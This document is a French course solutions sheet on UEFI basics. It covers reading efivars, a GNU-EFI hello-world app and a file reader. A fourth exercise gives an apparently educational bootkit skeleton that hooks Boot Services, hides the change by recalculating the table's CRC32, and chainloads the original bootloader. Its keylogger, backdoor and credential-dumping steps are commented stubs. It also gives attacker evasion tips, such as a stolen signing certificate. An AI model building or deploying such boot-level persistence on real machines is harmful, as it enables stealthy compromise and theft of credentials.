# Solutions - UEFI Basics

## Solution Exercice 1 : Lire les variables UEFI (Très facile)

### Objectif
Lire et afficher les variables UEFI depuis Linux.

### Code complet

```c
/*
 * Lecteur de variables UEFI
 *
 * Compilation :
 *   gcc -o uefi_reader solution1.c
 *
 * Usage :
 *   ./uefi_reader
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <dirent.h>
#include <fcntl.h>
#include <unistd.h>

#define EFIVARFS_PATH "/sys/firmware/efi/efivars"

/*
 * Liste toutes les variables UEFI disponibles
 */
void list_uefi_variables(void) {
    DIR *dir;
    struct dirent *entry;
    int count = 0;

    printf("[*] Énumération des variables UEFI\n");
    printf("    Path : %s\n\n", EFIVARFS_PATH);

    dir = opendir(EFIVARFS_PATH);
    if (!dir) {
        perror("[-] Erreur opendir");
        printf("    Système non-UEFI ou efivarfs non monté\n");
        printf("    Essayez : sudo mount -t efivarfs none /sys/firmware/efi/efivars\n");
        return;
    }

    printf("Variables UEFI trouvées :\n");
    printf("─────────────────────────────────────────────────────────\n");

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;

        count++;

        // Format : VarName-GUID
        printf("  [%03d] %s\n", count, entry->d_name);

        // Afficher quelques variables importantes
        if (strncmp(entry->d_name, "Boot", 4) == 0 ||
            strncmp(entry->d_name, "Secure", 6) == 0 ||
            strncmp(entry->d_name, "Setup", 5) == 0) {
            printf("        → Variable importante\n");
        }
    }

    closedir(dir);

    printf("─────────────────────────────────────────────────────────\n");
    printf("Total : %d variables\n\n", count);
}

/*
 * Lit et affiche le contenu d'une variable UEFI
 */
int read_uefi_variable(const char *name) {
    char path[512];
    uint8_t buffer[4096];
    int fd;
    ssize_t size;

    snprintf(path, sizeof(path), "%s/%s", EFIVARFS_PATH, name);

    printf("[*] Lecture de la variable : %s\n", name);
    printf("    Path complet : %s\n\n", path);

    fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("[-] Erreur open");
        return -1;
    }

    // Lire le contenu
    size = read(fd, buffer, sizeof(buffer));
    close(fd);

    if (size < 4) {
        printf("[-] Variable vide ou erreur de lecture\n");
        return -1;
    }

    // Les 4 premiers bytes = attributes
    uint32_t attributes = *(uint32_t *)buffer;

    printf("[+] Attributs : 0x%08x\n", attributes);

    // Décoder les attributs
    printf("    Flags :\n");
    if (attributes & 0x00000001)
        printf("      - NON_VOLATILE (persistant)\n");
    if (attributes & 0x00000002)
        printf("      - BOOTSERVICE_ACCESS\n");
    if (attributes & 0x00000004)
        printf("      - RUNTIME_ACCESS\n");
    if (attributes & 0x00000008)
        printf("      - HARDWARE_ERROR_RECORD\n");
    if (attributes & 0x00000020)
        printf("      - TIME_BASED_AUTHENTICATED_WRITE_ACCESS\n");

    printf("\n[+] Taille des données : %ld bytes\n", size - 4);

    // Afficher les données (max 256 bytes)
    printf("[+] Données (hex) :\n");
    printf("    ");

    size_t display_size = (size - 4) > 256 ? 256 : (size - 4);

    for (size_t i = 4; i < 4 + display_size; i++) {
        printf("%02x ", buffer[i]);

        if ((i - 3) % 16 == 0) printf("\n    ");
    }

    if (size - 4 > 256) {
        printf("\n    ... (%ld bytes tronqués)\n", size - 4 - 256);
    }

    printf("\n\n");

    // Tenter d'interpréter comme du texte UTF-16
    printf("[+] Interprétation UTF-16 (si applicable) :\n");
    printf("    ");

    for (size_t i = 4; i < 4 + display_size; i += 2) {
        uint16_t c = *(uint16_t *)&buffer[i];
        if (c >= 32 && c < 127) {
            printf("%c", (char)c);
        } else if (c == 0) {
            printf(" ");
        } else {
            printf(".");
        }
    }

    printf("\n\n");

    return 0;
}

/*
 * Cherche des variables intéressantes
 */
void find_interesting_variables(void) {
    const char *interesting[] = {
        "SecureBoot",
        "SetupMode",
        "BootCurrent",
        "BootOrder",
        "Boot0000",
        "Boot0001",
        "PK",  // Platform Key
        "KEK", // Key Exchange Key
        NULL
    };

    printf("[*] Recherche de variables intéressantes\n\n");

    DIR *dir = opendir(EFIVARFS_PATH);
    if (!dir) {
        printf("[-] Impossible d'ouvrir %s\n", EFIVARFS_PATH);
        return;
    }

    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_name[0] == '.') continue;

        for (int i = 0; interesting[i] != NULL; i++) {
            if (strncmp(entry->d_name, interesting[i],
                strlen(interesting[i])) == 0) {

                printf("═══════════════════════════════════════════════════════\n");
                read_uefi_variable(entry->d_name);
            }
        }
    }

    closedir(dir);
}

int main(void) {
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║            Lecteur de Variables UEFI                    ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    // Vérifier si le système est UEFI
    if (access("/sys/firmware/efi", F_OK) != 0) {
        printf("[!] ATTENTION : Ce système ne semble pas être en mode UEFI\n");
        printf("    /sys/firmware/efi n'existe pas\n\n");
        return 1;
    }

    printf("[+] Système UEFI détecté\n\n");

    // Lister toutes les variables
    list_uefi_variables();

    // Chercher et afficher les variables intéressantes
    find_interesting_variables();

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║                    TERMINÉ                               ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n");

    return 0;
}
```

### Compilation et exécution

```bash
gcc -o uefi_reader solution1.c
./uefi_reader
```

### Résultat attendu

```
╔══════════════════════════════════════════════════════════╗
║            Lecteur de Variables UEFI                    ║
╚══════════════════════════════════════════════════════════╝

[+] Système UEFI détecté

[*] Énumération des variables UEFI
    Path : /sys/firmware/efi/efivars

Variables UEFI trouvées :
─────────────────────────────────────────────────────────
  [001] Boot0000-8be4df61-93ca-11d2-aa0d-00e098032b8c
        → Variable importante
  [002] Boot0001-8be4df61-93ca-11d2-aa0d-00e098032b8c
        → Variable importante
  [003] BootCurrent-8be4df61-93ca-11d2-aa0d-00e098032b8c
        → Variable importante
  [004] BootOrder-8be4df61-93ca-11d2-aa0d-00e098032b8c
        → Variable importante
  [005] SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c
        → Variable importante
  ...
─────────────────────────────────────────────────────────
Total : 42 variables

[*] Recherche de variables intéressantes

═══════════════════════════════════════════════════════
[*] Lecture de la variable : SecureBoot-8be4df61-...
    Path complet : /sys/firmware/efi/efivars/SecureBoot-...

[+] Attributs : 0x00000007
    Flags :
      - NON_VOLATILE (persistant)
      - BOOTSERVICE_ACCESS
      - RUNTIME_ACCESS

[+] Taille des données : 1 bytes
[+] Données (hex) :
    01

[+] Interprétation UTF-16 (si applicable) :
    .

═══════════════════════════════════════════════════════
```

---

## Solution Exercice 2 : Application UEFI Hello World (Facile)

### Code complet

```c
/*
 * Hello World UEFI Application
 *
 * Compilation avec GNU-EFI :
 *   gcc -I/usr/include/efi -I/usr/include/efi/x86_64 \
 *       -fno-stack-protector -fpic -fshort-wchar \
 *       -mno-red-zone -DEFI_FUNCTION_WRAPPER \
 *       -c solution2.c -o solution2.o
 *
 *   ld -nostdlib -znocombreloc -T /usr/lib/elf_x86_64_efi.lds \
 *      -shared -Bsymbolic -L /usr/lib /usr/lib/crt0-efi-x86_64.o \
 *      solution2.o -o solution2.so -lefi -lgnuefi
 *
 *   objcopy -j .text -j .sdata -j .data -j .dynamic -j .dynsym \
 *           -j .rel -j .rela -j .reloc --target=efi-app-x86_64 \
 *           solution2.so hello.efi
 *
 * Test :
 *   Copier hello.efi dans /boot/efi/EFI/BOOT/
 *   Booter depuis le Shell UEFI et exécuter hello.efi
 */

#include <efi.h>
#include <efilib.h>

/*
 * Point d'entrée UEFI
 */
EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle,
                            EFI_SYSTEM_TABLE *SystemTable) {
    // Initialiser la bibliothèque GNU-EFI
    InitializeLib(ImageHandle, SystemTable);

    // Effacer l'écran
    uefi_call_wrapper(SystemTable->ConOut->ClearScreen, 1,
                      SystemTable->ConOut);

    // Afficher un message d'accueil
    Print(L"╔══════════════════════════════════════════════════════════╗\n");
    Print(L"║              Hello from UEFI !                           ║\n");
    Print(L"╚══════════════════════════════════════════════════════════╝\n\n");

    // Afficher les informations système
    Print(L"[*] Informations système UEFI\n\n");

    Print(L"  Firmware Vendor   : %s\n", SystemTable->FirmwareVendor);

    Print(L"  UEFI Version      : %d.%d\n",
          SystemTable->Hdr.Revision >> 16,
          SystemTable->Hdr.Revision & 0xFFFF);

    Print(L"  ConOut Protocol   : 0x%lx\n", SystemTable->ConOut);
    Print(L"  ConIn Protocol    : 0x%lx\n", SystemTable->ConIn);

    // Afficher les informations sur l'image chargée
    Print(L"\n[*] Informations sur l'application\n\n");

    EFI_LOADED_IMAGE_PROTOCOL *LoadedImage;
    EFI_GUID LoadedImageProtocol = LOADED_IMAGE_PROTOCOL;

    EFI_STATUS Status = uefi_call_wrapper(
        SystemTable->BootServices->HandleProtocol,
        3,
        ImageHandle,
        &LoadedImageProtocol,
        (void **)&LoadedImage
    );

    if (!EFI_ERROR(Status)) {
        Print(L"  Image Base        : 0x%lx\n", LoadedImage->ImageBase);
        Print(L"  Image Size        : %lu bytes\n", LoadedImage->ImageSize);
        Print(L"  Parent Handle     : 0x%lx\n", LoadedImage->ParentHandle);
    }

    // Compter les handles disponibles
    Print(L"\n[*] Ressources système\n\n");

    UINTN HandleCount = 0;
    EFI_HANDLE *HandleBuffer = NULL;

    Status = uefi_call_wrapper(
        SystemTable->BootServices->LocateHandleBuffer,
        5,
        AllHandles,
        NULL,
        NULL,
        &HandleCount,
        &HandleBuffer
    );

    if (!EFI_ERROR(Status)) {
        Print(L"  Nombre de handles : %lu\n", HandleCount);

        // Libérer le buffer
        uefi_call_wrapper(SystemTable->BootServices->FreePool, 1, HandleBuffer);
    }

    // Afficher l'heure actuelle (si disponible)
    EFI_TIME Time;
    Status = uefi_call_wrapper(SystemTable->RuntimeServices->GetTime, 2,
                                &Time, NULL);

    if (!EFI_ERROR(Status)) {
        Print(L"\n[*] Date et heure\n\n");
        Print(L"  %04d-%02d-%02d %02d:%02d:%02d\n",
              Time.Year, Time.Month, Time.Day,
              Time.Hour, Time.Minute, Time.Second);
    }

    // Attendre une touche
    Print(L"\n\nAppuyez sur une touche pour quitter...\n");

    EFI_INPUT_KEY Key;
    while (uefi_call_wrapper(SystemTable->ConIn->ReadKeyStroke, 2,
                              SystemTable->ConIn, &Key) == EFI_NOT_READY);

    return EFI_SUCCESS;
}
```

### Script de compilation (build.sh)

```bash
#!/bin/bash

# Script de compilation pour application UEFI

set -e

APP_NAME="hello"
SOURCE="${APP_NAME}_solution.c"
OUTPUT="${APP_NAME}.efi"

echo "[*] Compilation de ${SOURCE}..."

# Compiler en objet
gcc -I/usr/include/efi -I/usr/include/efi/x86_64 \
    -fno-stack-protector -fpic -fshort-wchar \
    -mno-red-zone -DEFI_FUNCTION_WRAPPER \
    -c ${SOURCE} -o ${APP_NAME}.o

echo "[*] Link..."

# Linker
ld -nostdlib -znocombreloc -T /usr/lib/elf_x86_64_efi.lds \
   -shared -Bsymbolic -L /usr/lib /usr/lib/crt0-efi-x86_64.o \
   ${APP_NAME}.o -o ${APP_NAME}.so -lefi -lgnuefi

echo "[*] Conversion en format EFI..."

# Convertir en EFI
objcopy -j .text -j .sdata -j .data -j .dynamic -j .dynsym \
        -j .rel -j .rela -j .reloc --target=efi-app-x86_64 \
        ${APP_NAME}.so ${OUTPUT}

echo "[+] ${OUTPUT} créé avec succès !"
echo ""
echo "Pour tester :"
echo "  1. Copier ${OUTPUT} vers /boot/efi/EFI/BOOT/"
echo "  2. Redémarrer en mode UEFI Shell"
echo "  3. Exécuter : fs0:\\EFI\\BOOT\\${OUTPUT}"

# Nettoyage
rm -f ${APP_NAME}.o ${APP_NAME}.so
```

---

## Solution Exercice 3 : Lecture de fichier UEFI (Moyen)

### Code complet

```c
/*
 * Application UEFI qui lit un fichier sur le système
 */

#include <efi.h>
#include <efilib.h>

/*
 * Ouvre et lit un fichier
 */
EFI_STATUS ReadFile(EFI_FILE_PROTOCOL *Root, CHAR16 *FileName) {
    EFI_FILE_PROTOCOL *File;
    EFI_STATUS Status;
    CHAR8 Buffer[4096];
    UINTN BufferSize = sizeof(Buffer) - 1;

    Print(L"\n[*] Tentative de lecture : %s\n", FileName);

    // Ouvrir le fichier
    Status = uefi_call_wrapper(Root->Open, 5,
                                Root,
                                &File,
                                FileName,
                                EFI_FILE_MODE_READ,
                                0);

    if (EFI_ERROR(Status)) {
        Print(L"[-] Impossible d'ouvrir le fichier\n");
        Print(L"    Erreur : 0x%lx\n", Status);
        return Status;
    }

    Print(L"[+] Fichier ouvert avec succès\n");

    // Obtenir les informations du fichier
    EFI_FILE_INFO *FileInfo;
    UINTN FileInfoSize = SIZE_OF_EFI_FILE_INFO + 512;
    EFI_GUID FileInfoGuid = EFI_FILE_INFO_ID;

    FileInfo = AllocatePool(FileInfoSize);
    if (!FileInfo) {
        uefi_call_wrapper(File->Close, 1, File);
        return EFI_OUT_OF_RESOURCES;
    }

    Status = uefi_call_wrapper(File->GetInfo, 4,
                                File,
                                &FileInfoGuid,
                                &FileInfoSize,
                                FileInfo);

    if (!EFI_ERROR(Status)) {
        Print(L"[*] Informations fichier :\n");
        Print(L"    Nom      : %s\n", FileInfo->FileName);
        Print(L"    Taille   : %lu bytes\n", FileInfo->FileSize);
        Print(L"    Attributs: 0x%lx\n", FileInfo->Attribute);

        if (FileInfo->Attribute & EFI_FILE_DIRECTORY) {
            Print(L"    Type     : Répertoire\n");
            FreePool(FileInfo);
            uefi_call_wrapper(File->Close, 1, File);
            return EFI_SUCCESS;
        }
    }

    FreePool(FileInfo);

    // Lire le contenu
    Print(L"\n[*] Lecture du contenu...\n\n");

    ZeroMem(Buffer, sizeof(Buffer));
    Status = uefi_call_wrapper(File->Read, 3,
                                File,
                                &BufferSize,
                                Buffer);

    if (EFI_ERROR(Status)) {
        Print(L"[-] Erreur de lecture\n");
        uefi_call_wrapper(File->Close, 1, File);
        return Status;
    }

    Buffer[BufferSize] = '\0';

    Print(L"[+] %lu bytes lus\n\n", BufferSize);
    Print(L"─────────────────────────────────────────────────────────\n");
    Print(L"Contenu :\n\n");

    // Afficher le contenu (ASCII)
    for (UINTN i = 0; i < BufferSize; i++) {
        Print(L"%c", Buffer[i]);
    }

    Print(L"\n─────────────────────────────────────────────────────────\n");

    // Fermer le fichier
    uefi_call_wrapper(File->Close, 1, File);

    return EFI_SUCCESS;
}

/*
 * Liste le contenu d'un répertoire
 */
EFI_STATUS ListDirectory(EFI_FILE_PROTOCOL *Root, CHAR16 *DirPath) {
    EFI_FILE_PROTOCOL *Dir;
    EFI_STATUS Status;

    Print(L"\n[*] Liste du répertoire : %s\n\n", DirPath);

    // Ouvrir le répertoire
    Status = uefi_call_wrapper(Root->Open, 5,
                                Root,
                                &Dir,
                                DirPath,
                                EFI_FILE_MODE_READ,
                                EFI_FILE_DIRECTORY);

    if (EFI_ERROR(Status)) {
        Print(L"[-] Impossible d'ouvrir le répertoire\n");
        return Status;
    }

    // Lire les entrées
    EFI_FILE_INFO *FileInfo;
    UINTN FileInfoSize = SIZE_OF_EFI_FILE_INFO + 512;
    EFI_GUID FileInfoGuid = EFI_FILE_INFO_ID;
    UINTN Count = 0;

    while (TRUE) {
        FileInfo = AllocatePool(FileInfoSize);
        if (!FileInfo) break;

        UINTN Size = FileInfoSize;
        Status = uefi_call_wrapper(Dir->Read, 3, Dir, &Size, FileInfo);

        if (EFI_ERROR(Status) || Size == 0) {
            FreePool(FileInfo);
            break;
        }

        Count++;

        // Afficher l'entrée
        Print(L"  [%03lu] ", Count);

        if (FileInfo->Attribute & EFI_FILE_DIRECTORY) {
            Print(L"<DIR>  ");
        } else {
            Print(L"       ");
        }

        Print(L"%-30s  %10lu bytes\n",
              FileInfo->FileName,
              FileInfo->FileSize);

        FreePool(FileInfo);
    }

    Print(L"\n[+] Total : %lu entrées\n", Count);

    uefi_call_wrapper(Dir->Close, 1, Dir);

    return EFI_SUCCESS;
}

/*
 * Point d'entrée
 */
EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle,
                            EFI_SYSTEM_TABLE *SystemTable) {
    InitializeLib(ImageHandle, SystemTable);

    uefi_call_wrapper(SystemTable->ConOut->ClearScreen, 1,
                      SystemTable->ConOut);

    Print(L"╔══════════════════════════════════════════════════════════╗\n");
    Print(L"║         UEFI File Reader - Solution Exercice 3          ║\n");
    Print(L"╚══════════════════════════════════════════════════════════╝\n");

    // Obtenir le Simple File System Protocol
    EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;
    EFI_GUID FileSystemProtocol = SIMPLE_FILE_SYSTEM_PROTOCOL;
    EFI_FILE_PROTOCOL *Root;

    EFI_STATUS Status = uefi_call_wrapper(
        SystemTable->BootServices->LocateProtocol,
        3,
        &FileSystemProtocol,
        NULL,
        (void **)&FileSystem
    );

    if (EFI_ERROR(Status)) {
        Print(L"[-] Impossible de localiser le File System Protocol\n");
        goto end;
    }

    Print(L"[+] File System Protocol localisé\n");

    // Ouvrir le volume racine
    Status = uefi_call_wrapper(FileSystem->OpenVolume, 2,
                                FileSystem,
                                &Root);

    if (EFI_ERROR(Status)) {
        Print(L"[-] Impossible d'ouvrir le volume\n");
        goto end;
    }

    Print(L"[+] Volume racine ouvert\n");

    // Lister le répertoire /EFI/BOOT/
    ListDirectory(Root, L"\\EFI\\BOOT");

    // Essayer de lire le fichier grub.cfg
    ReadFile(Root, L"\\EFI\\BOOT\\grub.cfg");

    // Fermer le volume
    uefi_call_wrapper(Root->Close, 1, Root);

end:
    Print(L"\n\nAppuyez sur une touche...\n");
    EFI_INPUT_KEY Key;
    while (uefi_call_wrapper(SystemTable->ConIn->ReadKeyStroke, 2,
                              SystemTable->ConIn, &Key) == EFI_NOT_READY);

    return EFI_SUCCESS;
}
```

---

## Solution Exercice 4 : Bootkit UEFI Concept (Difficile)

### Objectif
Comprendre l'architecture d'un bootkit UEFI.

### Document d'architecture

```c
/*
 * ═══════════════════════════════════════════════════════════════════
 * BOOTKIT UEFI - Architecture et Implémentation Conceptuelle
 * ═══════════════════════════════════════════════════════════════════
 *
 * AVERTISSEMENT : Code éducatif uniquement
 * L'utilisation non autorisée est illégale
 */

#include <efi.h>
#include <efilib.h>

/*
 * ═══════════════════════════════════════════════════════════════════
 * PHASE 1 : INSTALLATION
 * ═══════════════════════════════════════════════════════════════════
 */

/*
 * Le bootkit s'installe dans l'ESP (EFI System Partition)
 *
 * Structure avant infection :
 *   /EFI/BOOT/BOOTX64.EFI  (bootloader légitime)
 *
 * Structure après infection :
 *   /EFI/BOOT/BOOTX64.EFI  (bootkit malveillant)
 *   /EFI/BOOT/BOOTX64_ORIG.EFI  (bootloader original renommé)
 *   /EFI/BOOT/.hidden/    (fichiers du bootkit)
 */

EFI_STATUS InstallBootkit(EFI_HANDLE ImageHandle,
                          EFI_SYSTEM_TABLE *SystemTable) {
    Print(L"[*] Installation du bootkit...\n");

    // 1. Localiser la partition ESP
    Print(L"  [1] Localisation de l'ESP\n");

    // 2. Renommer le bootloader légitime
    Print(L"  [2] Sauvegarde du bootloader original\n");
    // RenameFile(L"\\EFI\\BOOT\\BOOTX64.EFI",
    //            L"\\EFI\\BOOT\\BOOTX64_ORIG.EFI");

    // 3. Copier le bootkit à la place
    Print(L"  [3] Installation du bootkit\n");
    // CopyFile(L"\\BOOTKIT.EFI", L"\\EFI\\BOOT\\BOOTX64.EFI");

    // 4. Créer le répertoire caché pour les composants
    Print(L"  [4] Installation des composants\n");
    // CreateDirectory(L"\\EFI\\BOOT\\.hidden");

    Print(L"[+] Installation terminée\n");

    return EFI_SUCCESS;
}

/*
 * ═══════════════════════════════════════════════════════════════════
 * PHASE 2 : HOOKING DES BOOT SERVICES
 * ═══════════════════════════════════════════════════════════════════
 */

// Pointeurs vers les fonctions originales
EFI_EXIT_BOOT_SERVICES OriginalExitBootServices = NULL;
EFI_LOAD_IMAGE OriginalLoadImage = NULL;

/*
 * Hook de ExitBootServices
 * Permet de persister après le boot de l'OS
 */
EFI_STATUS EFIAPI HookedExitBootServices(
    EFI_HANDLE ImageHandle,
    UINTN MapKey) {

    Print(L"[HOOK] ExitBootServices intercepté\n");

    // Installer des hooks dans le kernel avant de passer le contrôle
    // Par exemple : patcher la table SSDT, installer un hyperviseur, etc.

    Print(L"  [*] Installation d'un hyperviseur...\n");
    // InstallHypervisor();

    Print(L"  [*] Hooks kernel installés\n");
    // PatchKernelMemory();

    // Appeler l'original
    return OriginalExitBootServices(ImageHandle, MapKey);
}

/*
 * Hook de LoadImage
 * Permet d'inspecter/modifier les images chargées
 */
EFI_STATUS EFIAPI HookedLoadImage(
    BOOLEAN BootPolicy,
    EFI_HANDLE ParentImageHandle,
    EFI_DEVICE_PATH_PROTOCOL *DevicePath,
    VOID *SourceBuffer,
    UINTN SourceSize,
    EFI_HANDLE *ImageHandle) {

    Print(L"[HOOK] LoadImage intercepté\n");

    // Appeler l'original
    EFI_STATUS Status = OriginalLoadImage(
        BootPolicy,
        ParentImageHandle,
        DevicePath,
        SourceBuffer,
        SourceSize,
        ImageHandle
    );

    if (!EFI_ERROR(Status)) {
        // Analyser/modifier l'image chargée
        EFI_LOADED_IMAGE_PROTOCOL *LoadedImage;
        EFI_GUID LoadedImageProtocol = LOADED_IMAGE_PROTOCOL;

        uefi_call_wrapper(
            gBS->HandleProtocol,
            3,
            *ImageHandle,
            &LoadedImageProtocol,
            (void **)&LoadedImage
        );

        if (LoadedImage) {
            Print(L"  [*] Image chargée : Base=0x%lx, Size=%lu\n",
                  LoadedImage->ImageBase,
                  LoadedImage->ImageSize);

            // Possibilité de patcher l'image ici
            // PatchLoadedImage(LoadedImage);
        }
    }

    return Status;
}

/*
 * Installer les hooks
 */
VOID InstallHooks(EFI_SYSTEM_TABLE *SystemTable) {
    Print(L"\n[*] Installation des hooks Boot Services...\n");

    // Sauvegarder les pointeurs originaux
    OriginalExitBootServices = SystemTable->BootServices->ExitBootServices;
    OriginalLoadImage = SystemTable->BootServices->LoadImage;

    // Installer les hooks
    SystemTable->BootServices->ExitBootServices = HookedExitBootServices;
    SystemTable->BootServices->LoadImage = HookedLoadImage;

    // Recalculer le CRC32 de la table Boot Services
    // Sinon UEFI détectera la modification
    SystemTable->BootServices->Hdr.CRC32 = 0;
    uefi_call_wrapper(
        SystemTable->BootServices->CalculateCrc32,
        3,
        SystemTable->BootServices,
        SystemTable->BootServices->Hdr.HeaderSize,
        &SystemTable->BootServices->Hdr.CRC32
    );

    Print(L"[+] Hooks installés\n");
}

/*
 * ═══════════════════════════════════════════════════════════════════
 * PHASE 3 : CHAINLOAD DU BOOTLOADER LÉGITIME
 * ═══════════════════════════════════════════════════════════════════
 */

EFI_STATUS ChainloadOriginalBootloader(EFI_HANDLE ImageHandle,
                                        EFI_SYSTEM_TABLE *SystemTable) {
    Print(L"\n[*] Chainloading du bootloader original...\n");

    EFI_DEVICE_PATH_PROTOCOL *DevicePath;
    EFI_HANDLE NewImageHandle;
    EFI_STATUS Status;

    // Construire le Device Path vers le bootloader original
    // (simplifié ici)

    Print(L"  [*] Chargement de BOOTX64_ORIG.EFI\n");

    // Charger l'image
    Status = uefi_call_wrapper(
        SystemTable->BootServices->LoadImage,
        6,
        FALSE,
        ImageHandle,
        DevicePath,  // Doit pointer vers BOOTX64_ORIG.EFI
        NULL,
        0,
        &NewImageHandle
    );

    if (EFI_ERROR(Status)) {
        Print(L"[-] Erreur LoadImage : 0x%lx\n", Status);
        return Status;
    }

    Print(L"  [+] Image chargée\n");

    // Démarrer l'image
    Print(L"  [*] Démarrage du bootloader...\n");

    Status = uefi_call_wrapper(
        SystemTable->BootServices->StartImage,
        3,
        NewImageHandle,
        NULL,
        NULL
    );

    // Ne devrait jamais retourner
    return Status;
}

/*
 * ═══════════════════════════════════════════════════════════════════
 * PHASE 4 : PAYLOAD MALVEILLANT
 * ═══════════════════════════════════════════════════════════════════
 */

VOID ExecutePayload(EFI_SYSTEM_TABLE *SystemTable) {
    Print(L"\n[*] Exécution du payload...\n");

    // Exemples de payloads :

    // 1. Keylogger UEFI
    Print(L"  [PAYLOAD] Installation keylogger\n");
    // InstallKeylogger();

    // 2. Network backdoor
    Print(L"  [PAYLOAD] Installation backdoor réseau\n");
    // InstallNetworkBackdoor();

    // 3. Credential dumping
    Print(L"  [PAYLOAD] Dump des credentials\n");
    // DumpCredentials();

    // 4. Persistence additionnelle
    Print(L"  [PAYLOAD] Installation persistence\n");
    // InstallPersistence();

    Print(L"[+] Payload exécuté\n");
}

/*
 * ═══════════════════════════════════════════════════════════════════
 * MAIN : POINT D'ENTRÉE DU BOOTKIT
 * ═══════════════════════════════════════════════════════════════════
 */

EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle,
                            EFI_SYSTEM_TABLE *SystemTable) {
    InitializeLib(ImageHandle, SystemTable);

    // Optionnel : cacher la sortie
    // SystemTable->ConOut->ClearScreen(SystemTable->ConOut);

    Print(L"╔══════════════════════════════════════════════════════════╗\n");
    Print(L"║              BOOTKIT UEFI - Initialisation               ║\n");
    Print(L"╚══════════════════════════════════════════════════════════╝\n");

    // Vérifier si c'est la première exécution
    // (Si BOOTX64_ORIG.EFI n'existe pas, c'est l'installation)

    EFI_STATUS Status;
    BOOLEAN FirstRun = TRUE;  // Simplification

    if (FirstRun) {
        // Installation
        InstallBootkit(ImageHandle, SystemTable);
    }

    // Installer les hooks
    InstallHooks(SystemTable);

    // Exécuter le payload
    ExecutePayload(SystemTable);

    // Chainload le bootloader légitime
    Status = ChainloadOriginalBootloader(ImageHandle, SystemTable);

    // Si on arrive ici, le chainload a échoué
    Print(L"\n[-] Erreur critique : Chainload échoué\n");
    Print(L"    Appuyez sur une touche...\n");

    EFI_INPUT_KEY Key;
    while (uefi_call_wrapper(SystemTable->ConIn->ReadKeyStroke, 2,
                              SystemTable->ConIn, &Key) == EFI_NOT_READY);

    return Status;
}

/*
 * ═══════════════════════════════════════════════════════════════════
 * NOTES TECHNIQUES
 * ═══════════════════════════════════════════════════════════════════
 *
 * DÉTECTION :
 *   - Checksums modifiés dans l'ESP
 *   - Secure Boot (si activé, bloque l'exécution)
 *   - TPM Measured Boot (logs d'intégrité)
 *   - Timing anormal au boot
 *
 * MITIGATION (pour l'attaquant) :
 *   - Re-signer avec certificat volé (bypass Secure Boot)
 *   - Minimiser les modifications visibles
 *   - Installer dans DXE drivers (plus furtif)
 *
 * DÉFENSES :
 *   - Secure Boot activé (obligatoire)
 *   - Vérification d'intégrité régulière de l'ESP
 *   - Intel Boot Guard / AMD Secure Processor
 *   - Updates firmware régulières
 *
 * ═══════════════════════════════════════════════════════════════════
 */
```

---

## Points clés à retenir

1. **UEFI** remplace le BIOS avec une architecture modulaire et puissante
2. **Variables UEFI** sont stockées dans la NVRAM et accessibles via `/sys/firmware/efi/efivars`
3. **Boot Services** sont disponibles avant l'OS, **Runtime Services** persistent après
4. **Hooking Boot Services** permet d'intercepter le processus de boot
5. **Bootkit UEFI** survit à la réinstallation de l'OS mais pas au formatage de l'ESP
6. **Secure Boot** est la principale défense contre les bootkits UEFI

## Impact et défenses

**Pour l'attaquant** :
- Persistance maximale (survit à reinstall OS)
- Exécution avant l'OS et les antivirus
- Contrôle total du boot process

**Pour le défenseur** :
- Activer Secure Boot (obligatoire)
- Vérifier l'intégrité de l'ESP régulièrement
- Utiliser Intel Boot Guard ou AMD Secure Processor
- Monitorer les modifications de l'ESP
- Updates firmware régulières

## Cas d'usage Red Team

- **APT** : Persistence long-terme sur infrastructure critique
- **Espionnage** : Keylogging dès le boot
- **Ransomware** : Chiffrement avant le boot de l'OS
- **Credential dumping** : Interception des credentials au boot
